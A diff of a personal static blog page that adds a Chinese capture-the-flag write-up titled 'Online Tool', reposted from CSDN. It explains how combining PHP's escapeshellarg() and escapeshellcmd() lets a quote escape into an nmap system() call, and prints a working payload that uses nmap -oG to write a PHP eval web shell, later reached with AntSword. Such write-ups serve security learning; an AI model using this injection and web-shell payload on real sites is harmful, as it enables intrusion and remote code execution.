@@ -7,7 +7,7 @@
 <meta name="description" content="温故而知新">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1624338322354">
+<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1626837321118">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
 <link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
@@ -746,6 +746,33 @@ https://www.cnblogs.com/tr1ple/p/11156279.html</p>
 </code></pre>
 <p>POST请求 ,获得flag<br>
 <img src="https://jinqipiaopiao.github.io//post-images/1624336030766.png" alt="" loading="lazy"></p>
+<h1 id="online-tool">Online Tool</h1>
+<p>remote_addr和x_forwarded_for这两个是见的比较多的，服务器获取ip用的，这里没什么用</p>
+<p>escapeshellarg()和escapeshellcmd() 没见过，百度</p>
+<p>PHP escapeshellarg()+escapeshellcmd() 之殇</p>
+<p>直接找到了上面这篇文章，这两个函数在一起用会有些问题</p>
+<pre><code>    传入的参数是：172.17.0.2' -v -d a=1
+    经过escapeshellarg处理后变成了'172.17.0.2'\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
+    经过escapeshellcmd处理后变成'172.17.0.2'\\'' -v -d a=1\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
+    最后执行的命令是curl '172.17.0.2'\\'' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。
+</code></pre>
+<p>简单的来说就是两次转译后出现了问题，没有考虑到单引号的问题</p>
+<p>然后往下看，看到echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</p>
+<p>这有个system来执行命令，而且有传参，肯定是利用这里了</p>
+<p>这里代码的本意是希望我们输入ip这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为我们看到了上面的漏洞所以我们可以逃脱这个引号的束缚</p>
+<p>这里常见的命令后注入操作如 | &amp; &amp;&amp;都不行，虽然我们通过上面的操作逃过了单引号，但escapeshellcmd会对这些特殊符号前面加上\来转移…</p>
+<p>这时候就只有想想能不能利用nmap来做些什么了。</p>
+<p>这时候搜索可以发现在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p>
+<p>这个命令就是我们的输入可控！然后写入到文件！OK很自然的想到了上传一个一句话木马了…</p>
+<pre><code>?host=' &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php '
+</code></pre>
+<p>执行后会返回文件夹名<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626830258385.png" alt="" loading="lazy"><br>
+然后蚁剑连接，找到flag<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626830273428.png" alt="" loading="lazy"><br>
+————————————————<br>
+版权声明：本文为CSDN博主「恋物语战场原」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/qq_26406447/article/details/100711933</p>
 
             </div>
           </article>
@@ -769,7 +796,7 @@ https://www.cnblogs.com/tr1ple/p/11156279.html</p>
 
       <div class="sm-12 md-4 col sidebar">
   <div class="paper info-container">
-    <img src="https://jinqipiaopiao.github.io//images/avatar.png?v=1624338322354" class="no-responsive avatar">
+    <img src="https://jinqipiaopiao.github.io//images/avatar.png?v=1626837321118" class="no-responsive avatar">
     <div class="text-muted">温故而知新</div>
     <div class="social-container">
       
@@ -791,6 +818,12 @@ https://www.cnblogs.com/tr1ple/p/11156279.html</p>
     </div>
     <div class="row">
       <ul>
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/shu-jia-xue-xi-bi-ji-ji-lu/">暑假学习笔记记录</a>
+            </li>
+          
         
           
             <li>
@@ -846,10 +879,6 @@ https://www.cnblogs.com/tr1ple/p/11156279.html</p>
             </li>
           
         
-          
-            <li>
-              <a href="https://jinqipiaopiao.github.io/post/tan-tao-yi-xia-yi-huo-xorwei-shi-me-neng-huan-yuan-de-wen-ti/">探讨一下异或(xor)为什么能还原的问题</a>
-            </li>
           
         
           
@@ -947,7 +976,7 @@ https://www.cnblogs.com/tr1ple/p/11156279.html</p>
     </div>
     <div class="row">
       
-        <a href="https://jinqipiaopiao.github.io/tag/I-a6dyp2Q/" class="badge success">
+        <a href="https://jinqipiaopiao.github.io/tag/I-a6dyp2Q/" class="badge ">
           Gridea
         </a>
       
